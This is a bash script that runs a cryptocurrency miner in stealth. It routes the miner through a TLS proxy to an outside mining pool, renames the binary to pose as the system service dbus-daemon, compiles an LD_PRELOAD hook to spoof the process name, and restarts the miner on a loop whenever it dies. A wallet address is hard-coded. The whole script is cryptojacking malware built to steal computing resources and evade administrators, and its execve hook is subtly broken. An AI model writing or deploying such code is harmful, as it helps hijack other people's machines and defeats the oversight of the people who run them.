#!/bin/bash

# Super Stealth Config
FAKE_NAME="dbus-daemon-$(shuf -i 100-999 -n 1)"
FAKE_PATH="/usr/local/bin/${FAKE_NAME}"
PORT=443

echo "🔒 Starting MAX STEALTH TLS Mining..."

# TLS Proxy
python3 -m aiostratum_proxy \
  --host 0.0.0.0 \
  --port ${PORT} \
  --pool-host asia.rplant.xyz \
  --pool-port 17059 \
  --pool-ssl \
  > /dev/null 2>&1 &

sleep 8

# Prepare Stealth Binary
cp /usr/local/bin/miner "$FAKE_PATH"
chmod +x "$FAKE_PATH"

# Advanced Hide with LD_PRELOAD + argv0 spoofing
cat > /tmp/hide.c << 'EOF'
#include <stdio.h>
#include <string.h>
#include <unistd.h>

int execve(const char *filename, char *const argv[], char *const envp[]) {
    if (strstr(filename, "miner") || (argv[0] && strstr(argv[0], "miner"))) {
        argv[0] = "/usr/bin/dbus-daemon";
    }
    return execve(filename, argv, envp);
}
EOF

gcc -shared -fPIC -o /tmp/hide.so /tmp/hide.c -ldl 2>/dev/null || true

echo "Launching hidden process as ${FAKE_NAME}..."

if [ -f /tmp/hide.so ]; then
    LD_PRELOAD=/tmp/hide.so "$FAKE_PATH" \
      -a yespowertide \
      -o stratum+tcps://127.0.0.1:${PORT} \
      -u TFCzMrjWvFXx2xsEE7QjZ4fTbxCezXGK9H \
      -p x \
      -t 2 \
      -B --no-color > /dev/null 2>&1 &
else
    exec -a "/usr/bin/dbus-daemon" "$FAKE_PATH" \
      -a yespowertide \
      -o stratum+tcps://127.0.0.1:${PORT} \
      -u TFCzMrjWvFXx2xsEE7QjZ4fTbxCezXGK9H \
      -p x \
      -t 2 \
      -B --no-color > /dev/null 2>&1 &
fi

echo "✅ MAX Stealth Active (Process hidden as dbus-daemon)"

# Auto Restart
while true; do
    sleep 25
    if ! pgrep -f ${FAKE_NAME} > /dev/null 2>&1; then
        echo "Restarting hidden miner..."
        if [ -f /tmp/hide.so ]; then
            LD_PRELOAD=/tmp/hide.so "$FAKE_PATH" -a yespowertide -o stratum+tcps://127.0.0.1:${PORT} -u TFCzMrjWvFXx2xsEE7QjZ4fTbxCezXGK9H -p x -t 2 -B > /dev/null 2>&1 &
        else
            exec -a "/usr/bin/dbus-daemon" "$FAKE_PATH" -a yespowertide -o stratum+tcps://127.0.0.1:${PORT} -u TFCzMrjWvFXx2xsEE7QjZ4fTbxCezXGK9H -p x -t 2 -B > /dev/null 2>&1 &
        fi
    fi
done
